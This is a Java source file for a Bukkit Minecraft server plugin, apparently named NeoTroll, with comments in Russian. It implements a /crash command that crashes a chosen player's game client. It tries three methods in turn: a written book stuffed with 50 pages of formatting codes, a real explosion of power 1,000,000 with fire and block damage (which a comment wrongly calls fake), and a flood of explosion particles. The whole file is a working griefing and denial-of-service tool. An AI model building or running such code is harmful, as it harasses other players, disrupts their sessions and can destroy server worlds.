package com.neotroll.neotroll;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.Particle;

public class CrashCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!sender.hasPermission("neotroll.crash")) {
            sender.sendMessage(ChatColor.RED + "You don't have permission to use this command!");
            return true;
        }

        if (args.length == 0) {
            sender.sendMessage(ChatColor.YELLOW + "Usage: /crash <player>");
            return true;
        }

        Player target = Bukkit.getPlayer(args[0]);
        if (target == null) {
            sender.sendMessage(ChatColor.RED + "Player not found or offline!");
            return true;
        }

        if (target.equals(sender)) {
            sender.sendMessage(ChatColor.RED + "You cannot crash yourself!");
            return true;
        }

        // Пробуем разные методы краша
        boolean success = crashWithBook(target) || crashWithExplosion(target) || crashWithParticles(target);

        if (success) {
            sender.sendMessage(ChatColor.GREEN + "Successfully crashed " + target.getName() + "'s client!");
            Bukkit.getLogger().info(sender.getName() + " crashed " + target.getName() + "'s client");
        } else {
            sender.sendMessage(ChatColor.RED + "Failed to crash " + target.getName() + ". They might be using a client mod.");
        }

        return true;
    }

    private boolean crashWithBook(Player player) {
        try {
            ItemStack book = new ItemStack(Material.WRITTEN_BOOK);
            BookMeta meta = (BookMeta) book.getItemMeta();

            if (meta != null) {
                meta.setTitle("§0");
                meta.setAuthor("§0");

                // Создаем очень длинную строку для краша
                StringBuilder crashText = new StringBuilder();
                for (int i = 0; i < 1000; i++) {
                    crashText.append("§").append(i % 10);
                }

                for (int i = 0; i < 50; i++) {
                    meta.addPage(crashText.toString());
                }

                book.setItemMeta(meta);

                // Открываем книгу у игрока
                player.openBook(book);
                return true;
            }
        } catch (Exception e) {
            // Игнорируем ошибки - пробуем следующий метод
        }
        return false;
    }

    private boolean crashWithExplosion(Player player) {
        try {
            // Создаем фейковый взрыв с огромными значениями
            player.getWorld().createExplosion(
                    player.getLocation(),
                    1000000.0f,
                    true,
                    true,
                    player
            );
            return true;
        } catch (Exception e) {
            // Пробуем следующий метод
        }
        return false;
    }

    private boolean crashWithParticles(Player player) {
        try {
            // Спавним огромное количество частиц
            for (int i = 0; i < 1000; i++) {
                player.spawnParticle(
                        Particle.EXPLOSION_HUGE,
                        player.getLocation(),
                        Integer.MAX_VALUE,
                        100, 100, 100,
                        1.0
                );
            }
            return true;
        } catch (Exception e) {
            // Пробуем следующий метод
        }
        return false;
    }
}